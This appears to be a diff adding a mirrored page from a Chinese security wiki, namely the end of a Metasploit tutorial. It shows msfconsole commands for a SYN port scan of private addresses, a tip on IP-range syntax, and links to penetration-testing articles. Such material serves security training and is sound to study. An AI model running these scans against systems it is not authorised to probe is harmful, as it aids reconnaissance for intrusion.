+</p>
+
+<p>
+Server
+Server Capture Modules
+</p>
+
+</div>
+
+<h4 id="syn端口扫描实例">6.2 SYN端口扫描实例</h4>
+<div class="level4">
+
+<p>
+1、进入msfconsole之后，使用auxiliary的syn扫描模块“use auxiliary/scanner/portscan/syn”，接着检查参数情况“show options”，设置必填参数“set RHOSTS 192.168.198.110,120,221-224”，运行“run”。
+</p>
+
+<p>
+Tips：多IP参数设置方法
+Nmap、Metasploit等工具经常会遇到多ip设置，其语法为：
+一个ip段，使用“-”来表示，如192.168.1.20到192.168.1.35可以表示为“192.168.1.20-35”；多个不连续的ip可以用“，”分隔开，如192.168.1.55和192.168.1.66两个不连续ip可以用“192.168.1.55,66”来表示。
+</p>
+
+</div>
+
+<h3 class="sectionedit8" id="相关资源">7、相关资源</h3>
+<div class="level3">
+<hr />
+
+<p>
+<a href="http://drops.wooyun.org/tips/2746" class="urlextern" title="http://drops.wooyun.org/tips/2746"  rel="nofollow">metasploit渗透测试笔记(内网渗透篇)</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/tips/2443" class="urlextern" title="http://drops.wooyun.org/tips/2443"  rel="nofollow">Mimikatz ON Metasploit</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/tips/2227" class="urlextern" title="http://drops.wooyun.org/tips/2227"  rel="nofollow">metasploit 渗透测试笔记(meterpreter篇)</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/tips/2143" class="urlextern" title="http://drops.wooyun.org/tips/2143"  rel="nofollow">metasploit 渗透测试笔记(基础篇)</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/tips/4413" class="urlextern" title="http://drops.wooyun.org/tips/4413"  rel="nofollow">Python编写shellcode注入程序</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/tools/1475" class="urlextern" title="http://drops.wooyun.org/tools/1475"  rel="nofollow">Cobalt Strike 之团队服务器的搭建与DNS通讯演示</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/tips/826" class="urlextern" title="http://drops.wooyun.org/tips/826"  rel="nofollow">Kali Linux渗透测试实战 第一章</a>
+</p>
+
+</div>
+
+              <!-- wikipage stop -->
+
+                            
+            </div>
+          </div>
+
+        </article>
+
+        
+      </main>
+
+      <footer id="dokuwiki__footer" class="small hidden-print">
+
+        <a href="javascript:void(0)" class="back-to-top hidden-print btn btn-default btn-sm" title="跳至内容>" id="back-to-top"><i class="glyphicon glyphicon-chevron-up"></i></a>
+
+                <div class="text-center">
+          <p id="dw__license">
+                      </p>
+                  </div>
+      </footer>
+
+      
+    </div><!-- /site -->
+
+    <div class="no"><img src="http://wiki.wooyun.org/lib/exe/indexer.php?id=tools%3Ametasploit&amp;1449197480" width="2" height="1" alt="" /></div>
+    <div id="screen__mode" class="no">
+      <span class="visible-xs"></span>
+      <span class="visible-sm"></span>
+      <span class="visible-md"></span>
+      <span class="visible-lg"></span>
+    </div>
+  </div>
+  <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->
+</body>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "http://hm.baidu.com/hm.js?2e9369dace9479584f08203285c7cbce";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<!-- Mirrored from wiki.wooyun.org/tools:metasploit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 02:58:29 GMT -->
+</html>
